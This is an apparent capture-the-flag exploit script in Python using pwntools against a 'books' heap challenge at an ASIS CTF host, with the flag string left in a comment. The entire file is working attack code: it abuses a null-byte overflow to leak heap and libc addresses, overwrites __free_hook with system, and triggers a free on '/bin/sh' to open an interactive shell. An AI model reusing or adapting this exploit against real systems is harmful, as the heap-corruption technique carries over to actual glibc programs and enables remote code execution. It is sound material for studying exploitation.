#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.23"
#port = 8888
host = "books.asis-ctf.ir"
port = 13007

# ASIS{*0ne_NuLL_Byte_to_rule_th3m_All*}

r = remote(host,port)


def create(namesize,name,descsize,desc):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(namesize))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(descsize))
    r.recvuntil(":")
    r.sendline(desc)

def edit(idx,desc):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(desc)

def setname(name):
    r.recvuntil(">")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(name)

def printbook():
    r.recvuntil(">")
    r.sendline("4")
    data = r.recvuntil("1. Create a book")
    return data

def remove(idx):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

r.recvuntil(":")
r.sendline("ddaa")

create(0x10,"meh",0x10,"orange")
create(0x30,"meh1",0x30,"orange2")
remove(1)
create(0x20,"ddaa",0x10,"fuck")
setname("a"*0x20)
remove(2)
data = printbook()
heapbase = u64(data.split()[4].ljust(8,"\x00"))-0x70
print "heapbase :",hex(heapbase)
create(0x80,"ddaa",0x40,"orangnogg")
remove(4)
data = printbook() 
#libcbase = u64(data.split()[3].ljust(8,"\x00")) - 0x3c4c58
libcbase = u64(data.split()[3].ljust(8,"\x00")) - 0x3be7b8 

print "libcbase :",hex(libcbase) 
#system = libcbase + 0x443d0
#free_hook = libcbase + 0x3c69a8
system = libcbase + 0x46640
free_hook = libcbase + 0x3c0a10
create(0x20,p64(1) + p64(free_hook)*2 + p64(0x20),0x40,"ddaa")
edit(1,p64(system))
r.recvuntil(">")
r.sendline("1")
r.recvuntil(":")
r.sendline("32")
r.recvuntil(":")
r.sendline("/bin/sh\x00")
r.recvuntil(":")
r.sendline("-1")
r.interactive()
